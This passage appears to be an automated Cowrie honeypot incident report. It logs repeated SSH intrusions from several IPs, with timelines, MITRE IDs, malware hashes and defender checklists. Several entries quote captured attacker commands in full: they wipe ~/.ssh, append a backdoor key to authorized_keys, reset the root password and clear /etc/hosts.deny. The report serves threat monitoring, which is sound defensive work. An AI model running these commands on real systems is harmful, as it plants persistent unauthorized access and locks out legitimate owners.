| `2026-04-19 06:09:35` | `cowrie.login.success` |
| `2026-04-19 06:09:36` | `cowrie.session.params` |
| `2026-04-19 06:09:36` | `cowrie.command.input` |
| `2026-04-19 06:09:36` | `cowrie.command.failed` |
| `2026-04-19 06:09:37` | `cowrie.log.closed` |
| `2026-04-19 06:09:37` | `cowrie.session.params` |
| `2026-04-19 06:09:37` | `cowrie.command.input` |
| `2026-04-19 06:09:38` | `cowrie.session.file_download` |
| `2026-04-19 06:09:38` | `cowrie.log.closed` |
| `2026-04-19 06:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.18.113[.]233` to AbuseIPDB if not already reported
- [ ] Block `14.18.113[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1819c8f2f485

| Field | Detail |
|---|---|
| **Source IP** | `14.18.113[.]233` |
| **First Seen** | 2026-04-19 06:09 |
| **Last Seen** | 2026-04-19 06:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:09:41` | `cowrie.session.connect` |
| `2026-04-19 06:09:41` | `cowrie.client.version` |
| `2026-04-19 06:09:41` | `cowrie.client.kex` |
| `2026-04-19 06:09:46` | `cowrie.login.success` |
| `2026-04-19 06:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.18.113[.]233` to AbuseIPDB if not already reported
- [ ] Block `14.18.113[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06b094c0d4f0

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:10 |
| **Last Seen** | 2026-04-19 06:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:10:49` | `cowrie.session.connect` |
| `2026-04-19 06:10:49` | `cowrie.client.version` |
| `2026-04-19 06:10:49` | `cowrie.client.kex` |
| `2026-04-19 06:10:50` | `cowrie.login.success` |
| `2026-04-19 06:10:50` | `cowrie.session.params` |
| `2026-04-19 06:10:50` | `cowrie.command.input` |
| `2026-04-19 06:10:50` | `cowrie.command.failed` |
| `2026-04-19 06:10:50` | `cowrie.log.closed` |
| `2026-04-19 06:10:50` | `cowrie.session.params` |
| `2026-04-19 06:10:50` | `cowrie.command.input` |
| `2026-04-19 06:10:51` | `cowrie.session.file_download` |
| `2026-04-19 06:10:51` | `cowrie.log.closed` |
| `2026-04-19 06:10:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e331153e0903

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:10 |
| **Last Seen** | 2026-04-19 06:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:10:52` | `cowrie.session.connect` |
| `2026-04-19 06:10:52` | `cowrie.client.version` |
| `2026-04-19 06:10:53` | `cowrie.client.kex` |
| `2026-04-19 06:10:53` | `cowrie.login.success` |
| `2026-04-19 06:10:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae3e6e34ba28

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:11 |
| **Last Seen** | 2026-04-19 06:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:11:22` | `cowrie.session.connect` |
| `2026-04-19 06:11:22` | `cowrie.client.version` |
| `2026-04-19 06:11:22` | `cowrie.client.kex` |
| `2026-04-19 06:11:23` | `cowrie.login.success` |
| `2026-04-19 06:11:23` | `cowrie.session.params` |
| `2026-04-19 06:11:23` | `cowrie.command.input` |
| `2026-04-19 06:11:23` | `cowrie.command.failed` |
| `2026-04-19 06:11:23` | `cowrie.log.closed` |
| `2026-04-19 06:11:24` | `cowrie.session.params` |
| `2026-04-19 06:11:24` | `cowrie.command.input` |
| `2026-04-19 06:11:24` | `cowrie.session.file_download` |
| `2026-04-19 06:11:24` | `cowrie.log.closed` |
| `2026-04-19 06:11:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17cc82036142

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:11 |
| **Last Seen** | 2026-04-19 06:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:11:26` | `cowrie.session.connect` |
| `2026-04-19 06:11:26` | `cowrie.client.version` |
| `2026-04-19 06:11:26` | `cowrie.client.kex` |
| `2026-04-19 06:11:27` | `cowrie.login.success` |
| `2026-04-19 06:11:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fcf216a7d3d

| Field | Detail |
|---|---|
| **Source IP** | `14.18.113[.]233` |
| **First Seen** | 2026-04-19 06:12 |
| **Last Seen** | 2026-04-19 06:12 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:pKwk5FThX827"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:12:15` | `cowrie.session.connect` |
| `2026-04-19 06:12:15` | `cowrie.client.version` |
| `2026-04-19 06:12:15` | `cowrie.client.kex` |
| `2026-04-19 06:12:16` | `cowrie.login.success` |
| `2026-04-19 06:12:17` | `cowrie.session.params` |
| `2026-04-19 06:12:17` | `cowrie.command.input` |
| `2026-04-19 06:12:17` | `cowrie.command.failed` |
| `2026-04-19 06:12:17` | `cowrie.log.closed` |
| `2026-04-19 06:12:18` | `cowrie.session.params` |
| `2026-04-19 06:12:18` | `cowrie.command.input` |
| `2026-04-19 06:12:18` | `cowrie.session.file_download` |
| `2026-04-19 06:12:18` | `cowrie.log.closed` |
| `2026-04-19 06:12:31` | `cowrie.session.params` |
| `2026-04-19 06:12:31` | `cowrie.command.input` |
| `2026-04-19 06:12:31` | `cowrie.log.closed` |
| `2026-04-19 06:12:32` | `cowrie.session.params` |
| `2026-04-19 06:12:32` | `cowrie.command.input` |
| `2026-04-19 06:12:33` | `cowrie.log.closed` |
| `2026-04-19 06:12:33` | `cowrie.session.params` |
| `2026-04-19 06:12:33` | `cowrie.command.input` |
| `2026-04-19 06:12:35` | `cowrie.session.file_download` |
| `2026-04-19 06:12:35` | `cowrie.log.closed` |
| `2026-04-19 06:12:35` | `cowrie.session.params` |
| `2026-04-19 06:12:35` | `cowrie.command.input` |
| `2026-04-19 06:12:36` | `cowrie.log.closed` |
| `2026-04-19 06:12:36` | `cowrie.session.params` |
| `2026-04-19 06:12:36` | `cowrie.command.input` |
| `2026-04-19 06:12:37` | `cowrie.log.closed` |
| `2026-04-19 06:12:37` | `cowrie.session.params` |
| `2026-04-19 06:12:37` | `cowrie.command.input` |
| `2026-04-19 06:12:37` | `cowrie.command.input` |
| `2026-04-19 06:12:38` | `cowrie.log.closed` |
| `2026-04-19 06:12:39` | `cowrie.session.params` |
| `2026-04-19 06:12:39` | `cowrie.command.input` |
| `2026-04-19 06:12:39` | `cowrie.log.closed` |
| `2026-04-19 06:12:40` | `cowrie.session.params` |
| `2026-04-19 06:12:40` | `cowrie.command.input` |
| `2026-04-19 06:12:40` | `cowrie.log.closed` |
| `2026-04-19 06:12:41` | `cowrie.session.params` |
| `2026-04-19 06:12:41` | `cowrie.command.input` |
| `2026-04-19 06:12:42` | `cowrie.log.closed` |
| `2026-04-19 06:12:43` | `cowrie.session.params` |
| `2026-04-19 06:12:43` | `cowrie.command.input` |
| `2026-04-19 06:12:43` | `cowrie.log.closed` |
| `2026-04-19 06:12:44` | `cowrie.session.params` |
| `2026-04-19 06:12:44` | `cowrie.command.input` |
| `2026-04-19 06:12:45` | `cowrie.log.closed` |
| `2026-04-19 06:12:46` | `cowrie.session.params` |
| `2026-04-19 06:12:46` | `cowrie.command.input` |
| `2026-04-19 06:12:46` | `cowrie.log.closed` |
| `2026-04-19 06:12:47` | `cowrie.session.params` |
| `2026-04-19 06:12:47` | `cowrie.command.input` |
| `2026-04-19 06:12:47` | `cowrie.log.closed` |
| `2026-04-19 06:12:48` | `cowrie.session.params` |
| `2026-04-19 06:12:48` | `cowrie.command.input` |
| `2026-04-19 06:12:49` | `cowrie.log.closed` |
| `2026-04-19 06:12:50` | `cowrie.session.params` |
| `2026-04-19 06:12:50` | `cowrie.command.input` |
| `2026-04-19 06:12:50` | `cowrie.log.closed` |
| `2026-04-19 06:12:51` | `cowrie.session.params` |
| `2026-04-19 06:12:51` | `cowrie.command.input` |
| `2026-04-19 06:12:51` | `cowrie.log.closed` |
| `2026-04-19 06:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.18.113[.]233` to AbuseIPDB if not already reported
- [ ] Block `14.18.113[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf20b3d1ff14

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:12 |
| **Last Seen** | 2026-04-19 06:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:12:25` | `cowrie.session.connect` |
| `2026-04-19 06:12:25` | `cowrie.client.version` |
| `2026-04-19 06:12:26` | `cowrie.client.kex` |
| `2026-04-19 06:12:26` | `cowrie.login.success` |
| `2026-04-19 06:12:26` | `cowrie.session.params` |
| `2026-04-19 06:12:26` | `cowrie.command.input` |
| `2026-04-19 06:12:26` | `cowrie.command.failed` |
| `2026-04-19 06:12:26` | `cowrie.log.closed` |
| `2026-04-19 06:12:27` | `cowrie.session.params` |
| `2026-04-19 06:12:27` | `cowrie.command.input` |
| `2026-04-19 06:12:27` | `cowrie.session.file_download` |
| `2026-04-19 06:12:27` | `cowrie.log.closed` |
| `2026-04-19 06:12:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd245a5fc9e7

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:12 |
| **Last Seen** | 2026-04-19 06:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:12:29` | `cowrie.session.connect` |
| `2026-04-19 06:12:29` | `cowrie.client.version` |
| `2026-04-19 06:12:29` | `cowrie.client.kex` |
| `2026-04-19 06:12:29` | `cowrie.login.success` |
| `2026-04-19 06:12:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4146f6dc235

| Field | Detail |
|---|---|
| **Source IP** | `210.14.142[.]89` |
| **First Seen** | 2026-04-19 06:12 |
| **Last Seen** | 2026-04-19 06:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:12:48` | `cowrie.session.connect` |
| `2026-04-19 06:12:48` | `cowrie.client.version` |
| `2026-04-19 06:12:48` | `cowrie.client.kex` |
| `2026-04-19 06:12:50` | `cowrie.login.success` |
| `2026-04-19 06:12:51` | `cowrie.session.params` |
| `2026-04-19 06:12:51` | `cowrie.command.input` |
| `2026-04-19 06:12:51` | `cowrie.command.failed` |
| `2026-04-19 06:12:51` | `cowrie.log.closed` |
| `2026-04-19 06:12:51` | `cowrie.session.params` |
| `2026-04-19 06:12:51` | `cowrie.command.input` |
| `2026-04-19 06:12:51` | `cowrie.session.file_download` |
| `2026-04-19 06:12:51` | `cowrie.log.closed` |
| `2026-04-19 06:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.14.142[.]89` to AbuseIPDB if not already reported
- [ ] Block `210.14.142[.]89` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76a9ad27f3eb

| Field | Detail |
|---|---|
| **Source IP** | `210.14.142[.]89` |
| **First Seen** | 2026-04-19 06:12 |
| **Last Seen** | 2026-04-19 06:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:12:57` | `cowrie.session.connect` |
| `2026-04-19 06:12:57` | `cowrie.client.version` |
| `2026-04-19 06:12:58` | `cowrie.client.kex` |
| `2026-04-19 06:12:58` | `cowrie.login.success` |
| `2026-04-19 06:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.14.142[.]89` to AbuseIPDB if not already reported
- [ ] Block `210.14.142[.]89` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7dbbc735714

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:14 |
| **Last Seen** | 2026-04-19 06:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:14:02` | `cowrie.session.connect` |
| `2026-04-19 06:14:02` | `cowrie.client.version` |
| `2026-04-19 06:14:02` | `cowrie.client.kex` |
| `2026-04-19 06:14:03` | `cowrie.login.success` |
| `2026-04-19 06:14:03` | `cowrie.session.params` |
| `2026-04-19 06:14:03` | `cowrie.command.input` |
| `2026-04-19 06:14:03` | `cowrie.command.failed` |
| `2026-04-19 06:14:03` | `cowrie.log.closed` |
| `2026-04-19 06:14:03` | `cowrie.session.params` |
| `2026-04-19 06:14:03` | `cowrie.command.input` |
| `2026-04-19 06:14:03` | `cowrie.session.file_download` |
| `2026-04-19 06:14:03` | `cowrie.log.closed` |
| `2026-04-19 06:14:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a05bdf3a402

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:14 |
| **Last Seen** | 2026-04-19 06:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:14:05` | `cowrie.session.connect` |
| `2026-04-19 06:14:05` | `cowrie.client.version` |
| `2026-04-19 06:14:06` | `cowrie.client.kex` |
| `2026-04-19 06:14:06` | `cowrie.login.success` |
| `2026-04-19 06:14:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f154456215c2

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:18 |
| **Last Seen** | 2026-04-19 06:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:18:53` | `cowrie.session.connect` |
| `2026-04-19 06:18:53` | `cowrie.client.version` |
| `2026-04-19 06:18:53` | `cowrie.client.kex` |
| `2026-04-19 06:18:53` | `cowrie.login.success` |
| `2026-04-19 06:18:53` | `cowrie.session.params` |
| `2026-04-19 06:18:53` | `cowrie.command.input` |
| `2026-04-19 06:18:53` | `cowrie.command.failed` |
| `2026-04-19 06:18:54` | `cowrie.log.closed` |
| `2026-04-19 06:18:54` | `cowrie.session.params` |
| `2026-04-19 06:18:54` | `cowrie.command.input` |
| `2026-04-19 06:18:54` | `cowrie.session.file_download` |
| `2026-04-19 06:18:54` | `cowrie.log.closed` |
| `2026-04-19 06:18:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36a390bac80d

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:18 |
| **Last Seen** | 2026-04-19 06:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:18:56` | `cowrie.session.connect` |
| `2026-04-19 06:18:56` | `cowrie.client.version` |
| `2026-04-19 06:18:56` | `cowrie.client.kex` |
| `2026-04-19 06:18:57` | `cowrie.login.success` |
| `2026-04-19 06:18:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26b2ef34860c

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:21 |
| **Last Seen** | 2026-04-19 06:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
